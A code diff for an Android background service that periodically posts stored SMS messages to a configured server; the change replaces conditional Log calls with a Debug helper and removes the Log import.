@@ -35,7 +35,6 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.telephony.SmsMessage;
 import android.util.Base64;
-import android.util.Log;
 import android.webkit.URLUtil;
 
 /**
@@ -108,8 +107,7 @@ public class BackgroundService extends Service
 			public void run()
 			{
 				isSending = true;
-				if(Constants.DEBUG_LOG)
-					Log.i(Constants.TAG, "-------------------- Run Every: " + TIME_SCHEDULE + " seconds!!!! ------------------------");
+				Debug.d("-------------------- Run Every: " + TIME_SCHEDULE + " seconds!!!! ------------------------");
 				// Try to send all the Sms Objects
 				sendSmsObjects();
 			}
@@ -135,19 +133,16 @@ public class BackgroundService extends Service
 				{
 					response = null;
 					response = postSmsObject(sms);
-					if(Constants.DEBUG_LOG)
-						Log.i(Constants.TAG, "POST sms: " + sms.getId() + " and the response is: " + response);
+					Debug.d("POST sms: " + sms.getId() + " and the response is: " + response);
 				}
 				catch(Exception e)
 				{
-					if(Constants.DEBUG_LOG)
-						Log.e(Constants.TAG, "sendSmsObjects(): Exception: " + e.toString(), e);
+					Debug.e(e);
 				}
 			}
 			else
 			{
-				if(Constants.DEBUG_LOG)
-					Log.i(Constants.TAG, "--!-- No Internet Connection --!--");
+				Debug.d("--!-- No Internet Connection --!--");
 			}
 
 			// Check if response is null
@@ -181,8 +176,7 @@ public class BackgroundService extends Service
 		}
 		else
 		{
-			if(Constants.DEBUG_LOG)
-				Log.i(Constants.TAG, "--!-- SERVER_URL ERROR --!--");
+			Debug.d("--!-- SERVER_URL ERROR --!--");
 		}
 
 		// Set the POST parameters
@@ -230,21 +224,18 @@ public class BackgroundService extends Service
 			}
 			catch(ClientProtocolException e)
 			{
-				if(Constants.DEBUG_LOG)
-					Log.i(Constants.TAG, "--!-- postSmsObject(): ClientProtocolException: --!--: " + e.toString());
+				Debug.e(e);
 
 			}
 			catch(IOException e)
 			{
-				if(Constants.DEBUG_LOG)
-					Log.i(Constants.TAG, "--!-- postSmsObject(): IOException: --!--: " + e.toString());
+				Debug.e(e);
 			}
 
 		}
 		catch(UnsupportedEncodingException e)
 		{
-			if(Constants.DEBUG_LOG)
-				Log.i(Constants.TAG, "--!-- postSmsObject(): UnsupportedEncodingException: --!--: " + e.toString());
+			Debug.e(e);
 		}
 
 		return null;
@@ -368,15 +359,13 @@ public class BackgroundService extends Service
 			mScheduledFuture.cancel(true);
 			stopSelf();
 			int pid = android.os.Process.myPid();
-			if(Constants.DEBUG_LOG)
-				Log.i(Constants.TAG, "BackgroundService: onDestroy() + killProcess(" + pid + ") ");
+			Debug.d("BackgroundService: onDestroy() + killProcess(" + pid + ") ");
 			android.os.Process.killProcess(pid);
 
 		}
 		catch(Exception e)
 		{
-			if(Constants.DEBUG_LOG)
-				Log.i(Constants.TAG, "BackgroundService: onDestroy() + error: " + e.toString());
+			Debug.e(e);
 		}
 	}
 }
